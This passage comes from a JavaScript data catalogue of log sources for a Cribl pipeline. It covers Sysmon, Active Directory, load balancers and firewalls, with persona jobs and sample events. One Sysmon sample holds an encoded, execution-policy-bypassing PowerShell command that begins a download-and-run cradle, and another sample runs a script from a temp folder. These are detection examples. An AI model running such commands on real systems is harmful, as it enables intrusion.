            { persona: 'Data End User / Analyst', job: 'Track application hang events (1002) and correlate with memory consumption trends to identify memory leaks requiring application pool recycling' },
            { persona: 'Jack of All Trades', job: 'Correlate MSSQL error events with application crash patterns to identify database connectivity issues causing cascading application failures' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter informational MSI installer events and routine application status messages, reducing Application log volume by 45-65% while preserving all error-level events' },
            { persona: 'Data Engineer', job: 'Route crash dumps (1000), .NET exceptions (1026), and SQL errors to APM/SIEM while sending informational application telemetry to Lake for trend analysis' },
            { persona: 'Team Leader', job: 'Present per-application log volume breakdown showing optimization targets and cost savings from suppressing verbose application health checks' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detection rules for suspicious application installations, certificate store modifications, and .NET deserialization exceptions indicating exploitation attempts' },
            { persona: 'Data End User / Analyst', job: 'Investigate application exploitation by correlating .NET runtime exceptions with unusual module loads and process crash patterns indicating active attack payloads' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Deploy Cribl Edge Application Event Log collection with per-source provider filtering and deliver parsed events to monitoring stack within 20 minutes per server' },
            { persona: 'Platform Administrator', job: 'Standardize Application log collection across 200+ servers with centralized Edge fleet configuration filtering by provider name and event level' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'Datadog', 'Dynatrace', 'New Relic', 'Cribl Lake', 'Amazon S3', 'Elastic'],
        collectionMethod: 'Cribl Edge (Windows Event Logs input) / Windows Event Forwarding (WEF/WEC) / NXLog / Application Insights bridge',
        logFormat: 'Windows Event Log XML (EVTX). Key EventIDs: 1000 (app crash), 1002 (app hang), 1026 (.NET runtime), 1033/1040 (MSI), plus vendor-specific IDs.',
        avgEPS: '100-5,000 EPS per server depending on application count and verbosity',
        sampleEvent: '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Application Error"/><EventID>1000</EventID><Level>2</Level><TimeCreated SystemTime="2026-06-06T14:32:08.123Z"/><Computer>APP01.corp.example.com</Computer></System><EventData><Data>MyApp.exe</Data><Data>4.2.1.0</Data><Data>clr.dll</Data><Data>4.8.4682.0</Data><Data>c0000005</Data><Data>0x00000000001a2b3c</Data></EventData></Event>'
      },
      {
        id: 'windows-sysmon',
        name: 'Windows Sysmon (System Monitor)',
        vendor: 'Microsoft (Sysinternals)',
        description: 'Sysmon (System Monitor) telemetry providing detailed process creation with full command lines (Event 1), network connections (Event 3), file creation (Events 11/15), registry modifications (Events 12-14), DNS queries (Event 22), WMI events (Events 19-21), and process access/injection indicators (Events 8/10). The gold standard for Windows endpoint visibility.',
        status: 'available',
        useCases: ['Process Injection Detection', 'Malware Execution', 'Credential Dumping (LSASS)', 'Living-off-the-Land Binaries', 'Lateral Movement', 'Persistence Mechanisms', 'DNS-based C2', 'Registry Backdoors', 'DLL Hijacking', 'Named Pipe Abuse'],
        personas: ['SOC', 'Security Engineering', 'Threat Hunting', 'Incident Response', 'DFIR', 'Red Team'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 15+ detection rules for process injection (Event 8/10 targeting LSASS), LOLBin execution chains, persistence via registry (Events 12-14), and DLL hijacking with MITRE ATT&CK coverage' },
            { persona: 'Data End User / Analyst', job: 'Hunt for LSASS credential dumping by correlating ProcessAccess (Event 10) with suspicious granted access masks (0x1010/0x1410) from non-security tool processes' },
            { persona: 'Jack of All Trades', job: 'Detect living-off-the-land attacks by identifying suspicious parent-child process relationships (e.g., Office spawning PowerShell, WMI spawning cmd.exe) with encoded command lines' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume image load (Event 7) and DNS query (Event 22) events for known-good modules and domains, reducing Sysmon volume by 60-75% for SIEM delivery' },
            { persona: 'Data Engineer', job: 'Route process creation (Event 1), network connections (Event 3), and process access (Event 10) to SIEM while sending file/registry telemetry to Lake for hunting' },
            { persona: 'Team Leader', job: 'Demonstrate Sysmon optimization ROI by event ID showing 65%+ volume reduction with full MITRE ATT&CK technique detection coverage maintained' }
          ]},
          { category: 'Platform Operations', jobs: [
            { persona: 'Platform Administrator', job: 'Manage Sysmon configuration deployment across 5000+ endpoints via fleet management ensuring consistent detection coverage within 24 hours of config updates' },
            { persona: 'Data Onboarder', job: 'Deploy Sysmon event collection via Cribl Edge with event ID-based routing to multiple destinations within 30 minutes per endpoint group' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Engineer', job: 'Normalize Sysmon events into unified process execution schema for cross-platform correlation with Linux auditd and macOS endpoint security telemetry' },
            { persona: 'Data Onboarder', job: 'Enrich Sysmon process events with hash reputation lookups and MITRE ATT&CK technique tagging before routing to detection platforms' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Edge (Windows Event Logs input - Microsoft-Windows-Sysmon/Operational) / Windows Event Forwarding (WEF/WEC) / NXLog',
        logFormat: 'Windows Event Log XML (EVTX) under Microsoft-Windows-Sysmon/Operational. Key EventIDs: 1 (Process Create), 3 (Network), 7 (Image Load), 8 (CreateRemoteThread), 10 (ProcessAccess), 11 (FileCreate), 12-14 (Registry), 22 (DNS Query).',
        avgEPS: '2,000-30,000 EPS per endpoint depending on Sysmon config verbosity',
        sampleEvent: '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/><EventID>1</EventID><Level>4</Level><TimeCreated SystemTime="2026-06-06T14:32:08.123Z"/><Computer>WKS01.corp.example.com</Computer></System><EventData><Data Name="UtcTime">2026-06-06 14:32:08.123</Data><Data Name="ProcessId">4521</Data><Data Name="Image">C:\\Windows\\System32\\cmd.exe</Data><Data Name="CommandLine">cmd.exe /c powershell -ep bypass -nop -enc SQBFAFgAIAAoACgATgBlAHcALQBPAGIA</Data><Data Name="ParentImage">C:\\Windows\\explorer.exe</Data><Data Name="ParentCommandLine">C:\\Windows\\explorer.exe</Data><Data Name="User">CORP\\jsmith</Data><Data Name="Hashes">SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874714</Data><Data Name="ParentProcessId">2100</Data><Data Name="IntegrityLevel">Medium</Data></EventData></Event>'
      },
      {
        id: 'windows-wef',
        name: 'Windows Event Forwarding (WEF/WEC)',
        vendor: 'Microsoft',
        description: 'Consolidated Windows Event Log collection via Windows Event Forwarding infrastructure. WEF subscriptions aggregate events from Security, System, Application, Sysmon, PowerShell, and custom channels across the fleet to Windows Event Collector (WEC) servers. Provides centralized event routing, subscription management, and delivery guarantees.',
        status: 'available',
        useCases: ['Centralized Log Collection', 'Multi-Channel Correlation', 'Subscription Health Monitoring', 'Forwarding Latency Detection', 'Agent Coverage Gaps', 'Event Drop Detection', 'Collector Capacity Planning', 'Cross-Server Attack Correlation', 'Compliance Log Retention'],
        personas: ['Security Engineering', 'SOC', 'Platform Engineering', 'Windows Administration', 'Compliance', 'DFIR'],
        jobsToBeDone: [
          { category: 'Platform Operations', jobs: [
            { persona: 'Platform Administrator', job: 'Monitor WEF subscription health across 5000+ endpoints detecting forwarding failures and delivery latency exceeding 5-minute thresholds within 2 minutes' },
            { persona: 'Platform Operator', job: 'Scale WEC collector infrastructure to handle 200K+ EPS with zero event drops during peak authentication hours and deployment surges' },
            { persona: 'Data Onboarder', job: 'Deploy Cribl Edge on WEC servers with ForwardedEvents channel collection and multi-destination routing within 30 minutes per collector' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build cross-server correlation rules that detect attack progression across multiple endpoints by sequencing Security, Sysmon, and PowerShell events from WEF' },
            { persona: 'Data End User / Analyst', job: 'Investigate fleet-wide attacks by querying centralized WEF data to trace lateral movement across 100+ servers within a single 10-minute investigation workflow' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Track WEF agent coverage showing percentage of fleet forwarding events and identify machines dropping off subscription within 1 hour of last event' },
            { persona: 'Data End User / Analyst', job: 'Monitor forwarding latency distribution by source machine to identify network segments with degraded WEF delivery impacting detection timeliness' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Apply event ID-level filtering at the WEC/Cribl Edge layer to suppress noisy events before SIEM delivery, reducing forwarded volume by 50-65%' },
            { persona: 'Data Engineer', job: 'Route high-value Security and Sysmon events to SIEM while sending System and Application events to Lake, splitting WEF traffic by channel and severity' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Edge on WEC servers (Windows Event Logs input - ForwardedEvents channel) / Cribl Stream HTTP source (WEC → HTTP POST) / Direct WinRM collection',
        logFormat: 'Windows Event Log XML (EVTX) from ForwardedEvents channel. Each event retains original channel, provider, and computer name. Subscription metadata appended by WEC infrastructure.',
        avgEPS: '10,000-200,000 EPS per WEC server depending on subscription scope and fleet size',
        sampleEvent: '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4688</EventID><Level>0</Level><TimeCreated SystemTime="2026-06-06T14:32:08.123Z"/><Computer>WKS042.corp.example.com</Computer><Channel>ForwardedEvents</Channel></System><EventData><Data Name="SubjectUserName">jsmith</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="NewProcessName">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -File C:\\Temp\\script.ps1</Data><Data Name="ParentProcessName">C:\\Windows\\System32\\cmd.exe</Data><Data Name="TokenElevationType">%%1937</Data></EventData></Event>'
      }
    ]
  },
  {
    category: 'Load Balancers',
    icon: '⚖️',
    sources: [
      {
        id: 'f5-bigip-ltm',
        name: 'F5 BIG-IP LTM',
        vendor: 'F5 Networks',
        description: 'F5 BIG-IP Local Traffic Manager logs including HTTP request/response details, pool member health, SSL handshake events, iRule execution, and connection table events. Primary source for application delivery security and performance monitoring.',
        status: 'available',
        useCases: ['Web Application Attacks', 'Bot Detection', 'SSL/TLS Anomalies', 'DDoS Mitigation', 'Backend Pool Health', 'Latency Analysis', 'Connection Exhaustion', 'Certificate Expiry Monitoring'],
        personas: ['Security Engineering', 'SOC', 'SRE', 'Platform Engineering', 'NOC', 'Application Development'],
        jobsToBeDone: [
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor backend pool member health and response time p95/p99 to detect application degradation within 60 seconds and trigger automated failover' },
            { persona: 'Data End User / Analyst', job: 'Track SSL handshake failure rates and certificate expiry timelines to prevent service outages from expired or misconfigured TLS configurations' },
            { persona: 'Jack of All Trades', job: 'Correlate connection table exhaustion trends with traffic volume spikes to predict capacity issues and right-size virtual server configurations' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detection rules for DDoS layer 7 attacks (HTTP flood patterns), SSL renegotiation abuse, and bot traffic exceeding rate limit thresholds per virtual server' },
            { persona: 'Data End User / Analyst', job: 'Investigate application-layer attacks by correlating iRule-logged request anomalies with source IP reputation and geographic access patterns within 5 minutes' },
            { persona: 'Data Content Creator', job: 'Create alerts for SSL/TLS downgrade attempts, invalid client certificates, and cipher suite negotiation anomalies indicating MITM or scanning activity' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Suppress repetitive health monitor check logs and routine pool member status messages, reducing F5 LTM log volume by 55-70% for SIEM delivery' },
            { persona: 'Data Engineer', job: 'Route security-relevant iRule alerts and SSL errors to SIEM while sending performance metrics and access logs to Lake for capacity analytics' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure HSL (High-Speed Logging) profiles with syslog delivery to Cribl Stream and parse iRule key-value logs within 30 minutes per BIG-IP cluster' },
            { persona: 'Data Engineer', job: 'Normalize F5 LTM access logs into common load balancer schema for cross-platform correlation with AWS ALB and NGINX upstream metrics' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Datadog', 'Dynatrace', 'Cribl Lake', 'Elastic'],
        collectionMethod: 'Syslog (HSL) / iRule logging / REST API / SNMP traps',
        logFormat: 'Syslog (RFC 3164/5424) with configurable HSL (High-Speed Logging) profiles. iRule-generated logs follow custom key=value or JSON format. Management plane uses structured audit logging.',
        avgEPS: '5,000-50,000 EPS depending on virtual server traffic volume and logging profile verbosity',
        sampleEvent: 'Jun 06 14:22:18 bigip01.prod ltm[12345]: Rule /Common/http_request_logging <HTTP_REQUEST>: 10.1.2.100 -> 203.0.113.50:443 GET /api/v2/users HTTP/1.1 Host=api.example.com User-Agent="Mozilla/5.0" X-Forwarded-For=198.51.100.42 pool=/Common/api_pool member=10.10.1.5:8080 response_time=45ms status=200 bytes_in=1234 bytes_out=56789 ssl_cipher=ECDHE-RSA-AES256-GCM-SHA384 ssl_protocol=TLSv1.3'
      },
      {
        id: 'aws-alb-logs',
        name: 'AWS ALB/NLB Access Logs',
        vendor: 'Amazon Web Services',
        description: 'Application Load Balancer and Network Load Balancer access logs capturing every request processed. Includes client IP, target processing time, TLS cipher, request URL, response code, and Lambda/ECS target details. Often the highest-volume AWS log source and the primary entry point for all cloud-native application traffic.',
        status: 'available',
        useCases: ['Web Application Attack Detection', 'Latency Monitoring', 'Error Rate Analysis', 'Bot Detection', 'DDoS Identification', 'Target Health Correlation', 'Cost Attribution', 'API Usage Analytics'],
        personas: ['SOC', 'SRE', 'Platform Engineering', 'Security Engineering', 'Application Development', 'FinOps'],
        jobsToBeDone: [
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor target_processing_time P95/P99 per target group and identify backend instances causing latency outliers before they trigger health check failures' },
            { persona: 'Data End User / Analyst', job: 'Track 5xx error rates per target group and correlate with deployment events to detect bad releases within 2 minutes of rollout' },
            { persona: 'Jack of All Trades', job: 'Analyze request distribution across AZs to detect load balancer cross-zone imbalances causing unnecessary data transfer charges and uneven backend utilization' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Detect web application attacks by analyzing request URLs for SQL injection patterns, path traversal attempts, and abnormal query string lengths exceeding 2KB thresholds' },
            { persona: 'Data End User / Analyst', job: 'Identify credential stuffing by correlating high request volumes to authentication endpoints with elevated 401/403 response rates from single source IPs or CIDR blocks' },
            { persona: 'Data Content Creator', job: 'Build scanner detection rules using User-Agent anomalies, abnormal HTTP method usage (OPTIONS/TRACE), and rapid sequential path enumeration patterns' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter health check requests (ELB-HealthChecker User-Agent) and 2xx responses to static assets — typically 40-60% of ALB log volume — while preserving all error responses and security-relevant requests' },
            { persona: 'Data Engineer', job: 'Route 4xx/5xx responses and slow requests (>1s target_processing_time) to SIEM for alerting while batching full access logs to S3/Lake for capacity planning' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Enable ALB access logging to S3, configure Cribl Stream S3 source with SQS notification trigger, and parse space-delimited ALB log format within 20 minutes per account' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Datadog', 'Elastic', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'S3 (with SQS/SNS notification) / Kinesis Data Firehose / CloudWatch Logs',
        logFormat: 'Space-delimited text — fields: type, timestamp, elb, client:port, target:port, request_processing_time, target_processing_time, response_processing_time, elb_status_code, target_status_code, received_bytes, sent_bytes, request (method url protocol), user_agent, ssl_cipher, ssl_protocol, target_group_arn, trace_id, domain_name, chosen_cert_arn, matched_rule_priority, request_creation_time, actions_executed, redirect_url, error_reason, target:port_list, target_status_code_list, classification, classification_reason, conn_trace_id.',
        avgEPS: '50,000-5,000,000 EPS (every HTTP request generates a log line; high-traffic web apps produce millions per hour)',
        sampleEvent: 'h2 2026-06-16T14:32:08.234000Z app/prod-api-alb/abc123def456 198.51.100.42:49152 10.0.1.55:8080 0.001 0.045 0.000 200 200 1234 56789 "GET https://api.example.com:443/v2/users?page=1 HTTP/2.0" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" ECDHE-RSA-AES128-GCM-SHA256 TLSv1.2 arn:aws:elasticloadbalancing:us-east-1:123456789012:targetgroup/prod-api/abc123 "Root=1-abc-def" "api.example.com" "arn:aws:acm:us-east-1:123456789012:certificate/abc-123" 0 2026-06-16T14:32:08.188000Z "forward" "-" "-" "10.0.1.55:8080" "200" "-" "-" TID_abc123'
      }
    ]
  },
  {
    category: 'Directory Services',
    icon: '🏢',
    sources: [
      {
        id: 'active-directory',
        name: 'Active Directory',
        vendor: 'Microsoft',
        description: 'Windows Active Directory Security and Directory Service event logs including authentication (Kerberos/NTLM), group policy changes, object modifications, replication events, and domain controller health. The foundational identity data source for on-premises Windows environments.',
        status: 'available',
        useCases: ['Credential Theft Detection', 'Privilege Escalation', 'Lateral Movement', 'Golden Ticket Detection', 'Group Policy Abuse', 'Replication Health', 'Account Lockout Troubleshooting', 'Service Account Monitoring'],
        personas: ['SOC', 'Security Engineering', 'Identity Team', 'Incident Response', 'Platform Engineering', 'NOC'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 10+ detection rules for Kerberoasting (4769 with RC4), Golden Ticket usage (4768 anomalies), DCSync attacks (4662 replication rights), and group policy abuse with MITRE ATT&CK mapping' },
            { persona: 'Data End User / Analyst', job: 'Investigate credential theft by correlating Kerberos ticket requests (4768/4769) with unusual encryption types and service account targeting patterns within 5 minutes' },
            { persona: 'Jack of All Trades', job: 'Detect privilege escalation by identifying group membership changes (4728/4732) adding users to Domain Admins or other sensitive groups outside change control windows' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor AD replication health (1566/1988) and detect replication failures between domain controllers within 5 minutes to prevent authentication outages' },
            { persona: 'Data End User / Analyst', job: 'Track account lockout patterns (4740) across DCs to identify the originating source and differentiate misconfigured services from active brute force attacks' },
            { persona: 'Platform Administrator', job: 'Audit group policy modifications and GPO link changes to detect unauthorized security policy weakening across OUs within 15 minutes of change' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Retain complete AD authentication and directory modification audit trail for 13+ months across all DCs to satisfy SOC2/PCI-DSS identity management requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate privileged group membership reports showing all changes to Domain Admins, Enterprise Admins, and Schema Admins with actor attribution and approval status' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume Kerberos TGT renewals and computer account authentication events, reducing AD security log volume by 50-65% while preserving all human authentication and change events' },
            { persona: 'Data Engineer', job: 'Route Kerberos anomalies, group changes, and replication events to SIEM while sending routine authentication success events to Lake for baseline and forensic analysis' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Cribl Lake', 'Elastic'],
        collectionMethod: 'Windows Event Forwarding (WEF) / Cribl Edge agent / NXLog / Splunk UF',
        logFormat: 'Windows Event Log XML (EVTX) — structured with EventID, Provider, Correlation, EventData. Critical channels: Security (4624-4634, 4648, 4672, 4720-4738, 4768-4776), Directory Service (1566, 1988, 2887), DNS Server.',
        avgEPS: '2,000-20,000 EPS per domain controller depending on domain size, authentication volume, and audit policy verbosity',
        sampleEvent: '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4624</EventID><TimeCreated SystemTime="2026-06-06T14:22:18.123Z"/><Computer>DC01.corp.example.com</Computer></System><EventData><Data Name="TargetUserName">jsmith</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">10.1.2.100</Data><Data Name="AuthenticationPackageName">Kerberos</Data><Data Name="LogonProcessName">Kerberos</Data></EventData></Event>'
      }
    ]
  },
  {
    category: 'Additional Firewalls',
    icon: '🔥',
    sources: [
      {
        id: 'fortinet-fortigate',
        name: 'Fortinet FortiGate Traffic & UTM Logs',
        vendor: 'Fortinet',
        description: 'Next-generation firewall logs from FortiGate appliances covering traffic sessions, UTM threat detection (antivirus, IPS, web filter, application control), VPN tunnels, and system events. Delivered via syslog or FortiAnalyzer.',
        status: 'available',
        useCases: ['Security Detection', 'Threat Prevention', 'Policy Enforcement', 'VPN Monitoring', 'Application Control', 'Web Filtering', 'Network Troubleshooting'],
        personas: ['Security Engineering', 'SOC', 'NOC', 'Platform Engineering', 'Incident Response'],
        jobsToBeDone: [
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Reduce FortiGate log volume by 40-55% by filtering routine allow traffic while preserving all UTM, deny, and VPN events for SIEM' },
            { persona: 'Data Engineer', job: 'Route UTM threat events to SIEM at full fidelity while sending session logs to Lake at storage-tier cost' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detections for port scanning, brute force attempts, IPS signature matches, and policy violations using pre-enriched FortiGate fields' },
            { persona: 'Data End User / Analyst', job: 'Correlate UTM blocks with traffic patterns to identify compromised hosts attempting lateral movement' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor VPN tunnel health, session counts, and bandwidth utilization across FortiGate clusters' },
            { persona: 'Data End User / Analyst', job: 'Track application usage trends and web filter block rates to inform policy tuning' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Parse FortiGate key=value syslog format and route to multiple destinations within 30 minutes using pre-built pack pipelines' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Google Chronicle', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Syslog (UDP/TCP/TLS) / FortiAnalyzer / REST API',
        logFormat: 'Key=value pair format: date=YYYY-MM-DD time=HH:MM:SS devname=hostname devid=serial logid=ID type=traffic/utm subtype=forward/ips/webfilter. Critical fields: srcip, dstip, srcport, dstport, action, service, policyid, app, utmaction.',
        avgEPS: '5,000-150,000 EPS depending on throughput, UTM features enabled, and logging verbosity',
        sampleEvent: 'date=2026-06-11 time=14:32:08 devname="FGT-HQ-01" devid="FG100F0000000001" logid="0000000013" type="traffic" subtype="forward" level="notice" vd="root" eventtime=1718107928 srcip=10.0.1.50 srcport=52341 srcintf="port1" dstip=203.0.113.100 dstport=443 dstintf="port2" policyid=5 sessionid=574326 proto=6 action="accept" duration=45 sentbyte=15000 rcvdbyte=89000 sentpkt=25 rcvdpkt=20 appcat="Web.Client" app="HTTPS.BROWSER" srccountry="Reserved" dstcountry="United States"'
      },
      {
        id: 'cisco-firepower',
        name: 'Cisco Firepower (FTD) Events',
        vendor: 'Cisco',
        description: 'Cisco Firepower Threat Defense intrusion events, connection events, file/malware events, and Security Intelligence alerts. Combines NGFW traffic logging with Snort IPS engine, Advanced Malware Protection (AMP) file disposition verdicts, and URL/DNS-based threat intelligence. Managed via Firepower Management Center (FMC) or Cisco Defense Orchestrator.',
        status: 'available',
        useCases: ['Intrusion Prevention', 'Malware Detection', 'Connection Visibility', 'File Disposition Tracking', 'URL Reputation Enforcement', 'Application Control', 'Network Segmentation Validation', 'Encrypted Traffic Analytics'],
        personas: ['SOC', 'Security Engineering', 'NOC', 'Incident Response', 'Platform Engineering', 'Threat Hunting'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Correlate Firepower intrusion events (Snort SID matches) with connection events to build detection chains showing full attack sequences — initial access, lateral movement, and data staging — with MITRE ATT&CK mapping' },
            { persona: 'Data End User / Analyst', job: 'Investigate malware incidents by tracing AMP file disposition events (malware, clean, unknown) through network file transfers with SHA256 correlation and sandbox verdict timeline' },
            { persona: 'Data Content Creator', job: 'Detect command-and-control traffic by combining Security Intelligence DNS/URL block events with connection events showing repeated short-interval outbound sessions to the same destination' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor Firepower connection event volume and processing latency to detect when inspection engines are overloaded and beginning to pass traffic uninspected' },
            { persona: 'Data End User / Analyst', job: 'Track application identification accuracy by analyzing connection events where app_proto differs from expected port-based classification, indicating shadow IT or protocol tunneling' },
            { persona: 'NOC', job: 'Identify top bandwidth consumers and application categories across security zones to validate segmentation policy effectiveness and capacity planning' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter "allow" connection events for established trusted flows (internal-to-internal, known good applications) — typically 60-75% of Firepower event volume — while preserving all IPS, malware, and block events' },
            { persona: 'Data Engineer', job: 'Route intrusion and malware events to SIEM at full fidelity, send connection summaries to Lake for network visibility, and drop redundant connection-start/connection-end pairs for same session' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure FMC eStreamer API or syslog output (RFC 5424) to Cribl Stream. Parse the Firepower unified event format with protocol-specific field extraction within 30 minutes per FMC' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'eStreamer API / Syslog (RFC 5424) / Cisco Security Analytics and Logging (SAL) / Secure Network Analytics',
        logFormat: 'JSON or CEF via syslog. Key event types: intrusion (SID, classification, priority, impact_flag), connection (initiator_ip, responder_ip, protocol, app_proto, web_app, url, bytes_sent/recv, action), file_event (file_name, file_type, sha256, disposition, malware_name), SI (indicator, type, block_type).',
        avgEPS: '20,000-2,000,000 EPS (connection events dominate; intrusion/file events are a small high-value subset)',
        sampleEvent: '{"timestamp":"2026-06-16T14:32:08.234Z","event_type":"intrusion","sensor":"FTD-01.corp.example.com","sid":1000001,"gid":1,"classification":"Attempted Information Leak","priority":1,"description":"ET POLICY Outbound SSL/TLS Certificate Observed (Cobalt Strike)","impact_flag":2,"blocked":true,"initiator_ip":"10.0.1.50","responder_ip":"185.234.72.11","initiator_port":49152,"responder_port":443,"protocol":"TCP","app_proto":"SSL","ingress_zone":"Inside","egress_zone":"Outside","ac_policy":"Production-IPS","ac_rule":"Block-Known-Malware","ioc_category":"CnC","mitre_tactic":"Command and Control","mitre_technique":"T1071.001"}'
      },
      {
        id: 'juniper-srx',
        name: 'Juniper SRX Firewall Logs',
        vendor: 'Juniper Networks',
        description: 'Next-generation firewall logs from Juniper SRX Series covering session logs (RT_FLOW), IDP/IPS intrusion detection events, AppSecure application identification, UTM (antivirus, web filtering, anti-spam), VPN tunnel events, screen/DoS protection, and chassis cluster failover. Delivered via structured syslog or Security Log stream to Juniper Security Director.',
        status: 'available',
        useCases: ['Session Monitoring', 'Intrusion Detection (IDP)', 'Application Identification', 'VPN Tunnel Health', 'DoS/Screen Protection', 'Policy Enforcement', 'Chassis Cluster Failover', 'UTM Threat Prevention', 'Network Troubleshooting', 'Capacity Planning'],
        personas: ['SOC', 'Security Engineering', 'NOC', 'Network Engineering', 'Platform Engineering', 'Incident Response'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detections combining IDP signature matches with session context (RT_FLOW) to create high-fidelity intrusion alerts — correlating attack signatures with actual connection success/failure and data transfer volume' },
            { persona: 'Data End User / Analyst', job: 'Investigate lateral movement by analyzing RT_FLOW_SESSION_CLOSE events showing east-west traffic patterns between security zones with abnormal byte ratios or connection durations' },
            { persona: 'Data Content Creator', job: 'Detect policy bypass attempts by identifying traffic matched to implicit deny rules or sessions classified by AppSecure as evasive applications (tor, psiphon, ultrasurf) across trust boundaries' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor SRX chassis cluster failover events and track active/backup node transitions to detect HA instability before it causes session drops or traffic blackholes' },
            { persona: 'Data End User / Analyst', job: 'Track session counts per zone pair and identify capacity exhaustion by monitoring session table utilization against platform limits (64K-10M sessions depending on model)' },
            { persona: 'NOC', job: 'Monitor VPN tunnel flap events and IKE negotiation failures to detect WAN connectivity issues affecting branch office reachability within 2 minutes' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter RT_FLOW_SESSION_CREATE events (redundant when SESSION_CLOSE contains full session summary) and routine screen counters — reducing SRX log volume by 45-60% while preserving IDP alerts and complete session records' },
            { persona: 'Data Engineer', job: 'Route IDP attacks and denied sessions to SIEM for real-time detection while sending allowed session summaries to Lake for network capacity analysis and compliance retention' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure SRX structured syslog (log-mode stream) to Cribl Stream with security-log-source-address, enable RT_FLOW and IDP log types, and parse structured key-value format within 30 minutes' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
